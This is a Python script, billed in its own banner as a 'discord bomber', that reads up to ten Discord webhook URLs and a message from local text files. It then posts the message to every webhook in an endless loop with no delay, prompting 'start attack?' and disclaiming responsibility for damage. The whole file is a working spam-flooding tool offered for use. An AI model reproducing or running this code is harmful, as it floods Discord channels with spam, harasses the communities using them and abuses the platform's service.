import requests
import gratient
import os
import linecache

os.system("title 𝙎𝙡𝙞𝙣𝙠'𝙨 𝙙𝙞𝙨𝙘𝙤𝙧𝙙 𝙗𝙤𝙢𝙗𝙚𝙧")
os.system("cls")


banner = (gratient.purple("""
**********************************************************************
*  ,_   ___,_,  _, _, ,_    ,_       __   _,  , ,  __   _,,_         *
*  | \,' | (_, /  / \,|_)   | \,    '|_) / \,|\/| '|_) /_,|_)        *
* _|_/  _|_,_)'\_'\_/'| \  _|_/     _|_)'\_/ | `| _|_)'\_'| \        *
*'     '   '     `'   '  `'        '     '   '  `'       `'  `       *
*                                                                    *
*    writen by Slinknight in 2021                                    *
*                                                                    *
**********************************************************************                       
"""))

print("")
print("i'm not responsible for any damage caused")
print("to stop the attack, close the application")
print(" ")

input("start attack? >> ")

webhook1 = linecache.getline('webhooks.txt', 1)
webhook2 = linecache.getline('webhooks.txt', 2)
webhook3 = linecache.getline('webhooks.txt', 3)
webhook4 = linecache.getline('webhooks.txt', 4)
webhook5 = linecache.getline('webhooks.txt', 5)
webhook6 = linecache.getline('webhooks.txt', 6)
webhook7 = linecache.getline('webhooks.txt', 7)
webhook8 = linecache.getline('webhooks.txt', 8)
webhook9 = linecache.getline('webhooks.txt', 9)
webhook10 = linecache.getline('webhooks.txt', 10)
text1line = linecache.getline('text.txt', 1) + linecache.getline('text.txt', 2)
text2line = str(linecache.getline('text.txt', 1)) + str(linecache.getline('text.txt', 2))

if len(text2line) > 2000:
    print("text is bigger than 2000 characters")
else:
    payload = {"content": text1line}

    while 1:   
        response = requests.post(webhook1, data=payload)
        response = requests.post(webhook2, data=payload)
        response = requests.post(webhook3, data=payload)
        response = requests.post(webhook4, data=payload)
        response = requests.post(webhook5, data=payload)
        response = requests.post(webhook6, data=payload)
        response = requests.post(webhook7, data=payload)
        response = requests.post(webhook8, data=payload)
        response = requests.post(webhook9, data=payload)
        response = requests.post(webhook10, data=payload)
